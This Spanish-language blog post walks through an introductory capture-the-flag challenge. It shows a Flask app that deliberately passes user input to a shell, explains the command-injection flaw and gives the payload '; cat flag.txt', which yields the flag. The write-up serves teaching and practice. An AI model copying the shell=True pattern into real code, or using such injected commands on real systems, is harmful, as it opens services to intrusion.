+++
date = "2025-03-05"
title = "Snyk Fetch The Flag - CTF 101"
author = "Javier Olmedo"
toc = false
+++

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_banner.png)

Este reto está diseñado como una **introducción a los CTFs** (Capture The Flag). Es un desafío sencillo que permite familiarizarse con la explotación de vulnerabilidades en aplicaciones web.

Al analizar el código fuente proporcionado, observamos que se trata de una aplicación web desarrollada con **Flask (Python)**, cuyo código es el siguiente:

```python
from flask import Flask, render_template, request, redirect, flash
import subprocess

app = Flask(__name__)
app.secret_key = "supersecretkey"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        name = request.form.get("name", "").strip()

        if not name:
            flash("Error: Name cannot be empty.", "error")
            return redirect("/")

        try:
            # I sure hope no one tries to run any commands by injecting here...
            output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
            flash(f"Hello, {output.strip()}! Good luck!", "success")
            # ...alright, the challenges won't be this obvious on game day, but I hope it gives you a good idea of how the game is played!
        except subprocess.CalledProcessError as e:
            flash(f"Error: {e.output.strip()}", "error")

        return redirect("/")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

## 🔍 ¿Dónde está la vulnerabilidad?

El problema principal radica en el siguiente fragmento de código:

```python
output = subprocess.check_output(f"echo {name}", shell=True, text=True, stderr=subprocess.STDOUT)
```

Aquí, el valor de `name` (proveniente de la entrada de usuario sin sanitizar) se concatena directamente dentro de un comando que se ejecuta con `subprocess.check_output()`, utilizando el argumento `shell=True`, por lo que podemos concatener un segundo comando con el payload `; <comando>`

## 💣 Explotación

Para obtener la flag, simplemente enviamos el siguiente payload como valor de `name`:

```bash
; cat flag.txt
```

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_001.png)

[![/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png)](/images/snyk_fetch_the_flag_ctf_101/snyk_fetch_the_flag_ctf_101_002.png)

## 🚩 Flag

```txt
flag{3b74fc0628299870edabc5072b25cf78}
```